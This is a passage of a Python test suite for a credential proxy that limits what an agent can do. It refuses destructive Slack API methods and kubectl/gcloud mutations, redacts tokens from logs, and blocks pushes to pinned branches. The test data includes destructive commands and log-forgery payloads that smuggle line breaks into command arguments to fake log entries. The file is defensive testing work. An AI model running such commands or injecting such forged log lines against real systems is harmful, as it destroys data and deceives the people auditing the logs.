        line = captured["logs"][0]
        self.assertNotIn("\n", line)
        message = line.split("message=", 1)[1]
        self.assertLessEqual(
            len(message), credential_proxy.PUBSUB_ERROR_MESSAGE_MAX_CHARS
        )

    def test_the_legacy_pull_names_the_subscription_too(self):
        captured = self.get(
            "/v1/chat/events", self.refuse(self.PermissionDenied("User not authorized."))
        )

        line = captured["logs"][0]
        self.assertIn("chat event pull failed", line)
        self.assertIn(f"subscription={self.SUBSCRIPTION}", line)
        self.assertEqual(
            {"error": "chat event pull failed"}, captured["payload"]
        )


class SlackRelayTest(unittest.TestCase):
    class FakeResponse:
        """Stands in for slack_sdk's SlackResponse.

        The payload lives on ``data``; the object itself is not a mapping and
        defines no ``keys()``, so ``dict(response)`` falls back to the iterator
        protocol and raises, exactly as the real class does.
        """

        def __init__(self, data, headers=None):
            self.data = data
            self.headers = headers or {}

        def __iter__(self):
            return iter([self])

    class FakeClient:
        token = "xoxb-not-returned"

        def api_call(self, method, **arguments):
            return SlackRelayTest.FakeResponse(
                {"ok": True, "method": method, "arguments": arguments},
                headers={"x-oauth-scopes": "chat:write", "other": "ignored"},
            )

    def relay(self):
        relay = SlackRelay.__new__(SlackRelay)
        relay.primary_client = self.FakeClient()
        relay.clients = {"T123": relay.primary_client}
        relay.workspaces = [{"teamId": "T123", "botUserId": "U123", "botName": "agent"}]
        relay._events = queue.Queue()
        relay._receipts = {}
        import threading

        relay._lock = threading.Lock()
        return relay

    def slack_modules(self):
        class FakeWebClient:
            def __init__(self, token):
                self.token = token

            def auth_test(self):
                if self.token == "invalid":
                    raise RuntimeError("authentication failed")
                return {
                    "team_id": "T123",
                    "team": "workspace",
                    "user_id": "U123",
                    "user": "agent",
                }

        class FakeSocketModeClient:
            def __init__(self, app_token, web_client):
                self.app_token = app_token
                self.web_client = web_client
                self.socket_mode_request_listeners = []

            def connect(self):
                return None

        class FakeSocketModeResponse:
            def __init__(self, envelope_id):
                self.envelope_id = envelope_id

        slack_sdk = types.ModuleType("slack_sdk")
        slack_sdk.WebClient = FakeWebClient
        socket_mode = types.ModuleType("slack_sdk.socket_mode")
        socket_mode.SocketModeClient = FakeSocketModeClient
        response = types.ModuleType("slack_sdk.socket_mode.response")
        response.SocketModeResponse = FakeSocketModeResponse
        return {
            "slack_sdk": slack_sdk,
            "slack_sdk.socket_mode": socket_mode,
            "slack_sdk.socket_mode.response": response,
        }

    def test_initialization_skips_invalid_token_when_another_is_valid(self):
        with mock.patch.dict(sys.modules, self.slack_modules()):
            relay = SlackRelay("invalid,valid", "app-token")
        self.assertEqual("valid", relay.primary_client.token)
        self.assertEqual("T123", relay.bootstrap()[0]["teamId"])
        self.assertEqual(1000, relay._events.maxsize)

    def test_initialization_rejects_all_invalid_tokens(self):
        with mock.patch.dict(sys.modules, self.slack_modules()):
            with self.assertRaisesRegex(RuntimeError, "no Slack bot token"):
                SlackRelay("invalid", "app-token")

    def test_forwards_unknown_web_api_method_and_arguments_unchanged(self):
        arguments = {"json": {"futureSchema": {"nested": [1, 2, 3]}}}
        result = self.relay().api_call(
            "T123", "future.method", arguments
        )
        self.assertTrue(result["ok"])
        self.assertEqual("future.method", result["method"])
        self.assertEqual(arguments, result["arguments"])
        self.assertNotIn("token", json.dumps(result))
        self.assertEqual({"x-oauth-scopes": "chat:write"}, result.get("__headers"))

    def test_a_destructive_web_api_method_is_refused(self):
        """Same gate as the Chat relay's, matched on the verb after the last dot.

        `chat.delete` and `conversations.kick` are one forwarded string away
        from the relay otherwise, and the token behind it is the workspace's.
        """
        relay = self.relay()
        for method in ("chat.delete", "conversations.kick", "conversations.archive", "files.remove"):
            with self.subTest(method=method):
                with self.assertRaises(ValueError):
                    relay.api_call("T123", method, {})

    def test_removing_the_bots_own_reaction_is_the_one_remove_that_passes(self):
        """`reactions.remove` takes off only the token's own reaction.

        The exemption is the exact method name. Every other `*.remove` and
        `*.delete` is still refused, and so is a case variant of the exempt
        name: the verb rule case-folds, the exemption does not.
        """
        relay = self.relay()
        self.assertTrue(relay.api_call("T123", "reactions.remove", {})["ok"])
        for method in (
            "chat.delete",
            "bookmarks.remove",
            "pins.remove",
            "Reactions.Remove",
            "reactions.REMOVE",
            " reactions.remove",
        ):
            with self.subTest(method=method):
                with self.assertRaises(ValueError):
                    relay.api_call("T123", method, {})

    def test_a_non_destructive_web_api_method_still_passes(self):
        relay = self.relay()
        for method in ("chat.postMessage", "conversations.list", "users.info"):
            with self.subTest(method=method):
                self.assertTrue(relay.api_call("T123", method, {})["ok"])

    def test_nack_requeues_event(self):
        relay = self.relay()
        relay._events.put({"type": "events_api", "payload": {"event": {}}})
        event = relay.pull(timeout_seconds=1)
        self.assertTrue(relay.settle(event["receipt"], acknowledge=False))
        retried = relay.pull(timeout_seconds=1)
        self.assertEqual("events_api", retried["type"])

    def test_nack_does_not_block_or_lose_receipt_when_queue_is_full(self):
        relay = self.relay()
        relay._events = queue.Queue(maxsize=1)
        relay._receipts["receipt"] = {
            "type": "events_api",
            "payload": {"event": {"type": "message"}},
        }
        relay._events.put_nowait({"type": "existing", "payload": {}})

        with self.assertLogs("credential-proxy", level="WARNING"):
            self.assertFalse(relay.settle("receipt", acknowledge=False))

        self.assertIn("receipt", relay._receipts)
        self.assertEqual("existing", relay._events.get_nowait()["type"])

    def test_incoming_event_is_acknowledged_and_dropped_when_queue_is_full(self):
        relay = self.relay()
        relay._events = queue.Queue(maxsize=1)
        relay._events.put_nowait({"type": "existing", "payload": {}})

        client = mock.Mock()
        request = types.SimpleNamespace(
            envelope_id="envelope", type="events_api", payload={"event": {}}
        )
        with mock.patch.dict(sys.modules, self.slack_modules()):
            with self.assertLogs("credential-proxy", level="WARNING"):
                relay._on_event(client, request)

        client.send_socket_mode_response.assert_called_once()
        self.assertEqual("existing", relay._events.get_nowait()["type"])

    def test_upload_reader_rejects_oversized_file(self):
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "upload"
            path.write_bytes(b"12345")
            with self.assertRaisesRegex(ValueError, "size limit"):
                read_upload(path, 4)

    def test_upload_reader_accepts_file_at_limit(self):
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "upload"
            path.write_bytes(b"1234")
            self.assertEqual(b"1234", read_upload(path, 4))

    def test_slack_error_detail_serializes_response_to_json(self):
        exc_with_data = Exception()
        exc_with_data.response = types.SimpleNamespace(
            data={"ok": False, "error": "invalid_auth"}
        )
        self.assertEqual(
            '{"error": "invalid_auth", "ok": false}',
            _slack_error_detail(exc_with_data),
        )

        exc_with_dict = Exception()
        exc_with_dict.response = {"error": "ratelimited"}
        self.assertEqual(
            '{"error": "ratelimited"}',
            _slack_error_detail(exc_with_dict),
        )

        exc_without_response = Exception("network error")
        self.assertEqual("unknown", _slack_error_detail(exc_without_response))

    def test_slack_error_fields_relays_only_the_whitelist(self):
        """The payload is a response to a call made with the relay's token.

        It goes both into the log and back across the proxy boundary to the
        agent, so only the diagnostic keys may cross — never whatever else a
        future Slack error body decides to carry.
        """
        exc = Exception()
        exc.response = types.SimpleNamespace(
            data={
                "ok": False,
                "error": "missing_scope",
                "needed": "chat:write",
                "provided": "channels:read",
                "response_metadata": {"messages": ["internal detail"]},
            }
        )
        self.assertEqual(
            {
                "ok": False,
                "error": "missing_scope",
                "needed": "chat:write",
                "provided": "channels:read",
            },
            _slack_error_fields(exc),
        )

    def test_slack_error_fields_separates_no_payload_from_an_empty_one(self):
        # An empty dict means Slack answered but said nothing relayable; None
        # means there was no response object at all. The handler branches on
        # the difference, so the two must not collapse into one another.
        exc_with_unrelayable_payload = Exception()
        exc_with_unrelayable_payload.response = {"warning": "superfluous_charset"}
        self.assertEqual({}, _slack_error_fields(exc_with_unrelayable_payload))

        self.assertIsNone(_slack_error_fields(Exception("network error")))

    def _slack_api_post(self, api_call):
        """Drive the relay's POST handler with an api_call of our choosing."""
        relay = self.relay()
        relay.api_call = api_call
        handler = CredentialProxyHandler.__new__(CredentialProxyHandler)
        handler.slack_relay = relay
        handler.slack_max_request_bytes = 1024
        handler.path = "/v1/chat/slack/api"
        handler._read_json_body = lambda _max_bytes=None: {
            "teamId": "T123",
            "method": "chat.postMessage",
            "arguments": {},
        }
        captured = {}
        handler._json = lambda status, payload: captured.update(
            status=status, payload=payload
        )
        with self.assertLogs("credential-proxy", level="WARNING"):
            handler._handle_slack_post()
        return captured

    def test_a_rejected_call_tells_the_agent_why(self):
        """The Slack error code has to survive the trip back, not just be logged.

        Every failure behind the proxy answers 502, so without the ``slack``
        object the caller cannot tell channel_not_found from missing_scope from
        the relay being down — and slack_relay_patch has nothing to rebuild the
        SlackApiError from.
        """

        def rejected(*_args, **_kwargs):
            exc = Exception("The request to the Slack API failed.")
            exc.response = types.SimpleNamespace(
                data={
                    "ok": False,
                    "error": "channel_not_found",
                    "response_metadata": {"messages": ["internal detail"]},
                }
            )
            raise exc

        captured = self._slack_api_post(rejected)

        self.assertEqual(HTTPStatus.BAD_GATEWAY, captured["status"])
        self.assertEqual(
            {
                "error": "Slack operation failed",
                "slack": {"ok": False, "error": "channel_not_found"},
            },
            captured["payload"],
        )
        self.assertNotIn("internal detail", json.dumps(captured["payload"]))

    def test_a_relay_failure_carries_no_slack_object(self):
        """Nothing to relay means no ``slack`` key, so the shim re-raises.

        A transport failure has to stay distinguishable from a Slack rejection
        on the agent side, and its only signal is the key's absence.
        """

        def broken(*_args, **_kwargs):
            raise RuntimeError("connection reset")

        captured = self._slack_api_post(broken)

        self.assertEqual(HTTPStatus.BAD_GATEWAY, captured["status"])
        self.assertEqual({"error": "Slack operation failed"}, captured["payload"])


class ReadOnlyGateTest(unittest.TestCase):
    """The gate that makes the PR-only write rule mechanical.

    The proxy refused credential disclosure long before it refused a mutation.
    These cover the wiring: that the gate runs, that it runs after the existing
    denylist so credential rules keep their own rule IDs, and that it can be
    switched off without a new image.
    """

    def setUp(self):
        self.original = CredentialProxyHandler.enforce_read_only
        CredentialProxyHandler.enforce_read_only = True

    def tearDown(self):
        CredentialProxyHandler.enforce_read_only = self.original

    def _decide(self, argv):
        """The blocked response the handler would send, or None if allowed."""
        result = credential_proxy.read_only_refusal(argv)
        return result[0] if result is not None else None

    def test_a_read_passes_the_gate(self):
        self.assertIsNone(self._decide(["kubectl", "get", "pods"]))

    def test_a_mutation_is_refused(self):
        refusal = self._decide(["kubectl", "delete", "ns", "prod"])
        self.assertIsNotNone(refusal)
        self.assertEqual("kubernetes.read-only", refusal["rule"])
        self.assertEqual("SECURITY_POLICY_BLOCKED", refusal["code"])

    def test_the_gate_can_be_switched_off(self):
        CredentialProxyHandler.enforce_read_only = False
        self.assertIsNone(self._decide(["kubectl", "delete", "ns", "prod"]))

    def test_the_gate_is_on_by_default(self):
        # A misread env var must not silently disarm the gate.
        with mock.patch.dict(os.environ, {}, clear=True):
            self.assertTrue(credential_proxy.read_only_enforced())
        with mock.patch.dict(os.environ,
                             {"CREDENTIAL_PROXY_ENFORCE_READ_ONLY": "banana"}):
            self.assertTrue(credential_proxy.read_only_enforced())
        with mock.patch.dict(os.environ,
                             {"CREDENTIAL_PROXY_ENFORCE_READ_ONLY": "false"}):
            self.assertFalse(credential_proxy.read_only_enforced())

    def test_credentials_do_not_leak_to_logs(self):
        # Verify that a token in argv does not get logged
        result = credential_proxy.read_only_refusal(
            ["kubectl", "--token=eyJhbGci.SECRET", "--as=admin", "get", "pods"]
        )
        self.assertIsNotNone(result)
        refusal, log_hint = result
        # The log hint should be the --as flag, not a secret-containing argv element
        self.assertEqual("--as", log_hint)
        self.assertNotIn("SECRET", log_hint)
        self.assertNotIn("eyJhbGci", log_hint)

    def test_gcloud_positionals_do_not_leak_to_logs(self):
        # Verify that positionals in gcloud don't get logged when capped at 3 words
        # "compute disks describe" is allowlisted, but it accepts a disk name positional
        # which should not appear in the log hint (capped at first 3 words)
        result = credential_proxy.read_only_refusal(
            ["gcloud", "compute", "disks", "describe", "SECRETDISKNAME", "--zone=us-central1-a"]
        )
        # This is allowed, so no refusal
        self.assertIsNone(result)

        # Test a mutation that WOULD refuse and check the hint cap
        result = credential_proxy.read_only_refusal(
            ["gcloud", "compute", "disks", "delete", "SECRETDISKNAME"]
        )
        self.assertIsNotNone(result)
        refusal, log_hint = result
        # The hint should cap at 3 words, excluding the credential positional
        self.assertEqual("compute.disks.delete", log_hint)
        self.assertNotIn("SECRETDISKNAME", log_hint)

    # Every payload here sits in argv position 1, not position 5. The previous
    # version of this test put the payload fifth, where the verb cap in
    # command_policy.evaluate -- `verb_tuple=tuple(words[:3])` -- dropped it
    # before the sanitizer ever saw it. All three assertions therefore held
    # against any implementation at all, including `filtered = s`. The cap is
    # what made the test vacuous, so the payload has to land inside it.
    #
    # It is genuinely reachable: gcloud group names are agent-chosen strings and
    # the first three of them go into the log hint verbatim.
    FORGERY_PAYLOADS = (
        ("\n", "compute\n2026-08-06 WARNING command complete exit_code=0"),
        ("\u2028", "compute\u20282026-08-06 WARNING exit_code=0"),   # LINE SEPARATOR, Zl
        ("\x85", "compute\x852026-08-06 WARNING exit_code=0"),       # NEL, Cc
        ("\r", "compute\r2026-08-06 WARNING exit_code=0"),
        ("\u2029", "compute\u20292026-08-06 WARNING exit_code=0"),   # PARA SEPARATOR, Zp
    )

    def test_log_sanitization_removes_control_chars(self):
        # Drive the real path rather than calling the filter directly: a forged
        # log line only matters if the payload reaches the logger, and
        # read_only_refusal builds the hint the handler passes to
        # _sanitize_for_logging.
        for character, payload in self.FORGERY_PAYLOADS:
            with self.subTest(character=repr(character)):
                result = credential_proxy.read_only_refusal(
                    ["gcloud", payload, "instances", "delete", "prod"]
                )
                self.assertIsNotNone(result)
                _, log_hint = result
                # If this fails the rest of the test is asserting about a string
                # that never held the payload, which is the bug being fixed.
                self.assertIn(character, log_hint)
                sanitized = credential_proxy._sanitize_for_logging(log_hint)
                self.assertNotIn(character, sanitized)

    def test_log_sanitization_leaves_a_single_line(self):
        # The property that actually matters. str.splitlines breaks on the whole
        # family a text log reader breaks on -- \n \r \v \f \x1c-\x1e \x85
        # \u2028 \u2029 -- so one line out means one line in the log.
        for character, payload in self.FORGERY_PAYLOADS:
            with self.subTest(character=repr(character)):
                sanitized = credential_proxy._sanitize_for_logging(payload)
                self.assertEqual([sanitized], sanitized.splitlines())
                self.assertNotIn(character, sanitized)

    def test_the_forgery_payload_survives_the_verb_cap(self):
        # Pins reachability itself, separately from the filter. If the hint ever
        # stopped carrying agent-chosen text, the tests above would go quiet
        # rather than fail, and the sanitizer would be unpinned again.
        result = credential_proxy.read_only_refusal(
            ["gcloud", "compute\ninjected", "instances", "delete", "prod"]
        )
        self.assertIsNotNone(result)
        _, log_hint = result
        self.assertEqual("compute\ninjected.instances.delete", log_hint)

    def test_log_sanitization_has_length_cap(self):
        # Verify that sanitizer caps at 64 chars to prevent unbounded expansion
        long_flag = "--verylongflagname" + "x" * 100
        sanitized = credential_proxy._sanitize_for_logging(long_flag)
        self.assertLessEqual(len(sanitized), 64)
        # Original should be truncated
        self.assertNotEqual(sanitized, long_flag)


class ServeArmsTheReadOnlyGateTest(unittest.TestCase):
    """`serve` is what copies the env var onto the handler.

    `read_only_enforced()` and `read_only_refusal()` were both covered, and the
    one line joining them was not: deleting
    `CredentialProxyHandler.enforce_read_only = read_only_enforced()` from
    `serve` left the whole suite green while the kill switch silently stopped
    working in either direction. This starts the real `serve` with the network
    parts stubbed and reads the attribute back off the class.
    """

    class _Stop(Exception):
        pass

    def setUp(self):
        self.original = CredentialProxyHandler.enforce_read_only
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.policy_path = Path(self.tmp.name) / "policy.json"
        self.policy_path.write_text(json.dumps({"rules": []}), encoding="utf-8")

    def tearDown(self):
        CredentialProxyHandler.enforce_read_only = self.original

    def _serve_with(self, enforce_value, extra_env: dict | None = None):
        owner = self
        bound = []

        def stop(server):
            bound.append(server)
            raise owner._Stop

        class FakeThread:
            def __init__(self, *args, **kwargs):
                pass

            def start(self):
                pass

        # The deployed configuration always serves the broker on the Unix
        # socket, and `serve` now refuses a TCP listener with no caller
        # authentication, so the socket is what this drives.
        args = types.SimpleNamespace(
            policy=str(self.policy_path),
            host="127.0.0.1",
            port=0,
            unix_socket=str(Path(self.tmp.name) / "backend.sock"),
            timeout_seconds=5,
            max_request_bytes=1 << 20,
            max_output_bytes=1 << 20,
            state_dir=str(Path(self.tmp.name) / "state"),
            # `full` rather than `credentials`: the read-only gate guards the
            # exec path, and `credentials` is the one role that does not serve
            # it. A namespace missing the attribute would fail at serve()'s
            # role check before reaching the gate this asserts on.
            role="full",
        )
        environment = {
            "API_SERVER_EXTERNAL_KEY": "external",
            "CREDENTIAL_PROXY_BOOTSTRAP_COMMAND": "",
            # The pool is off by default (2026-08-12), so this line is
            # belt-and-braces: the case drives `serve` for an unrelated
            # property with no pool mapping mounted, and says so explicitly
            # rather than leaning on the default.
            "CREDENTIAL_PROXY_SCOPED_SA_POOL": "0",
        }
        if enforce_value is not None:
            environment["CREDENTIAL_PROXY_ENFORCE_READ_ONLY"] = enforce_value
        environment.update(extra_env or {})
        try:
            with mock.patch.dict(os.environ, environment, clear=True), \
                    mock.patch.object(credential_proxy, "ThreadingTCPHTTPServer", mock.MagicMock()), \
                    mock.patch.object(credential_proxy.threading, "Thread", FakeThread), \
                    mock.patch.object(credential_proxy.ThreadingUnixHTTPServer, "serve_forever", stop):
                with self.assertRaises(self._Stop):
                    credential_proxy.serve(args)
        finally:
            for server in bound:
                server.server_close()
        return CredentialProxyHandler.enforce_read_only

    def test_serve_arms_the_gate_by_default(self):
        CredentialProxyHandler.enforce_read_only = False
        self.assertTrue(self._serve_with(None))

    def test_serve_hands_the_executor_the_container_limit(self):
        # The derivation runs in `serve`, not in the executor, so a test that
        # builds an executor directly gets no budget whatever the runner's
        # cgroup says, and this is the one place the variable has to reach.
        self._serve_with(None, extra_env={credential_proxy.ENV_MEMORY_LIMIT_BYTES: "1073741824"})
        self.assertEqual(1073741824, CredentialProxyHandler.executor.memory_limit_bytes)

    def test_serve_disables_the_budget_when_no_limit_is_known(self):
        with mock.patch.object(credential_proxy, "CGROUP_MEMORY_MAX_PATH", str(Path(self.tmp.name) / "absent")):
            self._serve_with(None)
        self.assertIsNone(CredentialProxyHandler.executor.memory_limit_bytes)

    def test_serve_disarms_the_gate_when_the_env_var_says_false(self):
        CredentialProxyHandler.enforce_read_only = True
        self.assertFalse(self._serve_with("false"))

    def test_serve_leaves_the_gate_armed_on_a_typo(self):
        CredentialProxyHandler.enforce_read_only = False
        self.assertTrue(self._serve_with("banana"))

    def test_serve_wires_base_branch_and_refuses_push_with_env_cleared(self):
        # Wires --base-branch CLI argument into CredentialProxyHandler.base_branch
        # and CredentialProxyHandler.vcs.base_branch, and verifies git_push_violation
        # enforces the configured base branch even with environment variables clear (#1498).
        args = argparse.Namespace(
            policy=str(self.policy_path),
            host="127.0.0.1",
            port=0,
            unix_socket=str(Path(self.tmp.name) / "backend.sock"),
            timeout_seconds=5,
            max_request_bytes=1 << 20,
            max_output_bytes=1 << 20,
            state_dir=str(Path(self.tmp.name) / "state"),
            role="full",
            base_branch="release/custom-base",
        )
        environment = {
            "API_SERVER_EXTERNAL_KEY": "external",
            "CREDENTIAL_PROXY_BOOTSTRAP_COMMAND": "",
            "CREDENTIAL_PROXY_SCOPED_SA_POOL": "0",
        }
        bound = []

        class FakeServer:
            def __init__(self, *a, **k):
                bound.append(self)

            def serve_forever(self):
                pass

            def server_close(self):
                pass

        class FakeThread:
            def __init__(self, target, daemon=True):
                pass

            def start(self):
                pass

        def stop(*_):
            raise self._Stop()

        try:
            with mock.patch.dict(os.environ, environment, clear=True), \
                    mock.patch.object(credential_proxy, "ThreadingTCPHTTPServer", FakeServer), \
                    mock.patch.object(credential_proxy.threading, "Thread", FakeThread), \
                    mock.patch.object(credential_proxy.ThreadingUnixHTTPServer, "serve_forever", stop):
                with self.assertRaises(self._Stop):
                    credential_proxy.serve(args)

            self.assertEqual("release/custom-base", CredentialProxyHandler.base_branch)
            self.assertIsNotNone(CredentialProxyHandler.vcs)
            assert CredentialProxyHandler.vcs is not None
            self.assertEqual("release/custom-base", CredentialProxyHandler.vcs.base_branch)

            # With environment cleared, push to release/custom-base is refused via CredentialProxyHandler.base_branch
            with mock.patch.dict(os.environ, {}, clear=True):
                violation = git_argument_violation(["git", "push", "origin", "release/custom-base"])
                self.assertIsNotNone(violation)
                self.assertIn("protected branch 'release/custom-base' is refused", violation or "")
        finally:
            CredentialProxyHandler.base_branch = ""
            for s in bound:
                s.server_close()

    # `apps` is spelled with another of GitHub's hosts: kept under the
    # canonical one, it is matched by every request for the repository.
    PINS = json.dumps(
        [
            {"repository": "https://github.com/acme/infra", "branch": "refs/heads/gitops-base"},
            {"repository": "https://www.github.com/acme/apps", "branch": "release"},
        ]
    )

    def test_serve_wires_the_pinned_bases_into_every_door_with_env_cleared(self):
        # The argparse default is where CREDENTIAL_PROXY_PINNED_BASES is read;
        # `serve` takes the parsed value and nothing else.
        with mock.patch.dict(
            os.environ, {"CREDENTIAL_PROXY_PINNED_BASES": self.PINS}, clear=True
        ), mock.patch.object(sys, "argv", ["credential_proxy.py"]):
            parsed = credential_proxy.parse_args()
        self.assertEqual(self.PINS, parsed.pinned_bases)

        args = argparse.Namespace(
            policy=str(self.policy_path),
            host="127.0.0.1",
            port=0,
            unix_socket=str(Path(self.tmp.name) / "backend.sock"),
            timeout_seconds=5,
            max_request_bytes=1 << 20,
            max_output_bytes=1 << 20,
            state_dir=str(Path(self.tmp.name) / "state"),
            role="full",
            base_branch="",
            pinned_bases=parsed.pinned_bases,
        )
        environment = {
            "API_SERVER_EXTERNAL_KEY": "external",
            "CREDENTIAL_PROXY_BOOTSTRAP_COMMAND": "",
            "CREDENTIAL_PROXY_SCOPED_SA_POOL": "0",
            "CREDENTIAL_PROXY_CONTENT_WORKSPACE": "1",
        }
        bound = []

        class FakeThread:
            def __init__(self, *args, **kwargs):
                pass

            def start(self):
                pass

        def stop(server):
            bound.append(server)
            raise self._Stop()

        originals = (
            CredentialProxyHandler.base_branch,
            CredentialProxyHandler.pinned_bases,
            CredentialProxyHandler.workspaces,
            CredentialProxyHandler.vcs,
        )
        expected = {
            ("github.com", "acme/infra"): "gitops-base",
            ("github.com", "acme/apps"): "release",
        }
        try:
            with mock.patch.dict(os.environ, environment, clear=True), \
                    mock.patch.object(credential_proxy, "ThreadingTCPHTTPServer", mock.MagicMock()), \
                    mock.patch.object(credential_proxy.threading, "Thread", FakeThread), \
                    mock.patch.object(credential_proxy.ThreadingUnixHTTPServer, "serve_forever", stop):
                with self.assertRaises(self._Stop):
                    credential_proxy.serve(args)

            self.assertEqual(expected, CredentialProxyHandler.pinned_bases)
            assert CredentialProxyHandler.vcs is not None
            self.assertEqual(expected, CredentialProxyHandler.vcs.pinned_bases)
            for repository, base in (
                ("acme/infra", "gitops-base"),
                ("acme/apps", "release"),
                ("https://www.github.com/acme/apps", "release"),
                ("https://github.com/Acme/Apps.git", "release"),
                ("acme/other", None),
            ):
                with self.subTest(repository=repository):
                    self.assertEqual(
                        base,
                        CredentialProxyHandler.vcs.capabilities({"repository": repository})["baseBranch"],
                    )
            assert CredentialProxyHandler.workspaces is not None
            self.assertEqual(expected, CredentialProxyHandler.workspaces.pinned_bases)

            # Each pinned branch is protected from a direct push, with no
            # `--base-branch` and the environment cleared.
            with mock.patch.dict(os.environ, {}, clear=True):
                for branch in ("gitops-base", "release"):
                    with self.subTest(push=branch):
                        violation = git_argument_violation(["git", "push", "origin", f"HEAD:{branch}"])
                        self.assertIn(f"protected branch '{branch}' is refused", violation or "")
                # Paired ordinary use: an ordinary branch still pushes.
                self.assertIsNone(
                    git_argument_violation(["git", "push", "origin", "HEAD:platform-agent/fix"])
                )
        finally:
            (
                CredentialProxyHandler.base_branch,
                CredentialProxyHandler.pinned_bases,
                CredentialProxyHandler.workspaces,
                CredentialProxyHandler.vcs,
            ) = originals
            for server in bound:
                server.server_close()

    def test_the_base_repository_flag_is_gone(self):
        with mock.patch.dict(os.environ, {}, clear=True), mock.patch.object(
            sys, "argv", ["credential_proxy.py", "--base-repository", "acme/infra"]
        ), mock.patch("sys.stderr", io.StringIO()):
            with self.assertRaises(SystemExit):
                credential_proxy.parse_args()

    def _serve_with_pinned_bases(self, pinned_bases):
        args = argparse.Namespace(
            policy=str(self.policy_path),
            host="127.0.0.1",
            port=0,
            unix_socket=str(Path(self.tmp.name) / "backend.sock"),
            timeout_seconds=5,
            max_request_bytes=1 << 20,
            max_output_bytes=1 << 20,
            state_dir=str(Path(self.tmp.name) / "state"),
            role="full",
            base_branch="",
            pinned_bases=pinned_bases,
        )
        environment = {
            "API_SERVER_EXTERNAL_KEY": "external",
            "CREDENTIAL_PROXY_BOOTSTRAP_COMMAND": "",
            "CREDENTIAL_PROXY_SCOPED_SA_POOL": "0",
        }
        bound = []

        class FakeThread:
            def __init__(self, *args, **kwargs):
                pass

            def start(self):
                pass

        def stop(server):
            bound.append(server)
            raise self._Stop()

        originals = (
            CredentialProxyHandler.base_branch,
            CredentialProxyHandler.pinned_bases,
            CredentialProxyHandler.workspaces,
            CredentialProxyHandler.vcs,
        )
        try:
            with mock.patch.dict(os.environ, environment, clear=True), \
                    mock.patch.object(credential_proxy, "ThreadingTCPHTTPServer", mock.MagicMock()), \
                    mock.patch.object(credential_proxy.threading, "Thread", FakeThread), \
                    mock.patch.object(credential_proxy.ThreadingUnixHTTPServer, "serve_forever", stop):
                credential_proxy.serve(args)
        finally:
            (
                CredentialProxyHandler.base_branch,
                CredentialProxyHandler.pinned_bases,
                CredentialProxyHandler.workspaces,
                CredentialProxyHandler.vcs,
            ) = originals
            for server in bound:
                server.server_close()

    def test_serve_refuses_pinned_bases_that_do_not_parse(self):
        # A pin that matches nothing would leave that repository's base off
        # with nothing said, so the broker does not start on one.
        infra = "https://github.com/acme/infra"
        for value in (
            "not json",
            '{"repository": "https://github.com/acme/infra", "branch": "b"}',
            '["https://github.com/acme/infra"]',
            "[null]",
            # A repository with no stated host would be matched on whichever
            # forge a request resolved to.
            json.dumps([{"repository": "acme/infra", "branch": "b"}]),
            json.dumps([{"repository": "github.com/acme/infra", "branch": "b"}]),
            json.dumps([{"repository": "https://github.com/-acme/infra", "branch": "b"}]),
            json.dumps([{"repository": 7, "branch": "b"}]),
            json.dumps([{"branch": "b"}]),
            json.dumps([{"repository": infra}]),
            json.dumps([{"repository": infra, "branch": ""}]),
            json.dumps([{"repository": infra, "branch": "refs/heads/"}]),
            json.dumps([{"repository": infra, "branch": "HEAD"}]),
            json.dumps([{"repository": infra, "branch": "-x"}]),
            json.dumps([{"repository": infra, "branch": "a..b"}]),
            json.dumps([{"repository": infra, "branch": ["b"]}]),
            # A branch some door would read as another branch: `heads/x` is
            # read as `x` by a push, and a second `refs/heads/` as the first.
            json.dumps([{"repository": infra, "branch": "heads/x"}]),
            json.dumps([{"repository": infra, "branch": "refs/heads/heads/x"}]),
            json.dumps([{"repository": infra, "branch": "refs/heads/refs/heads/HEAD"}]),
            json.dumps([{"repository": infra, "branch": "refs/heads/refs/heads/x"}]),
            # A path the forge never reads as a repository, which no request
            # could match: one segment, three, and a name that reads back as
            # another once asked for.
            json.dumps([{"repository": "https://github.com/acme", "branch": "b"}]),
            json.dumps([{"repository": "https://github.com/acme/infra/extra", "branch": "b"}]),
            json.dumps([{"repository": "https://github.com/acme/infra.git.git", "branch": "b"}]),
            # A host no forge this install serves.
            json.dumps([{"repository": "https://gitlab.example/acme/infra", "branch": "b"}]),
            json.dumps([{"repository": "https://gitlab.com/acme/infra", "branch": "b"}]),
            # One repository pinned twice, however it is spelled.
            json.dumps(
                [
                    {"repository": infra, "branch": "a"},
                    {"repository": "https://GitHub.com/Acme/Infra.git", "branch": "b"},
                ]
            ),
            json.dumps(
                [
                    {"repository": infra, "branch": "a"},
                    {"repository": "https://www.github.com/acme/infra", "branch": "b"},
                ]
            ),
        ):
            with self.subTest(value=value):
                with self.assertRaisesRegex(RuntimeError, "CREDENTIAL_PROXY_PINNED_BASES"):
                    self._serve_with_pinned_bases(value)

    def test_each_pin_is_kept_under_its_forge_s_reading(self):
        # The canonical host and the path the forge reads, whichever of the
        # forge's hosts and spellings the pin was written with, and the branch
        # with one `refs/heads/` gone.
        for repository in (
            "https://github.com/acme/infra",
            "https://www.github.com/acme/infra",
            "https://WWW.GitHub.com/acme/infra.git",
            "git@github.com:acme/infra.git",
        ):
            for branch in ("release/q3", "refs/heads/release/q3", " release/q3 "):
                with self.subTest(repository=repository, branch=branch):
                    self.assertEqual(
                        {("github.com", "acme/infra"): "release/q3"},
                        credential_proxy.parse_pinned_bases(
                            json.dumps([{"repository": repository, "branch": branch}])
                        ),
                    )
        for empty in ("", "  ", "[]"):
            with self.subTest(empty=empty):
                self.assertEqual({}, credential_proxy.parse_pinned_bases(empty))

    def test_a_pin_on_another_spelling_of_the_host_matches_a_request(self):
        pins = credential_proxy.parse_pinned_bases(
            json.dumps([{"repository": "https://www.github.com/acme/infra", "branch": "release"}])
        )
        broker = vcs_broker.VcsBroker(
            Path(self.tmp.name) / "vcs",
            git_runner=lambda *a, **k: self.fail("git ran"),
            pinned_bases=pins,
        )
        for repository in ("acme/infra", "https://github.com/acme/infra", "https://www.github.com/acme/infra"):
            with self.subTest(repository=repository):
                self.assertEqual(
                    "release", broker.capabilities({"repository": repository})["baseBranch"]
                )

    def test_a_pinned_base_cannot_be_pushed_under_another_spelling(self):
        with mock.patch.dict(os.environ, {}, clear=True), mock.patch.object(
            CredentialProxyHandler, "pinned_bases", {("github.com", "acme/infra"): "release"}
        ):
            for target in ("release", "refs/heads/release", "heads/release"):
                with self.subTest(target=target):
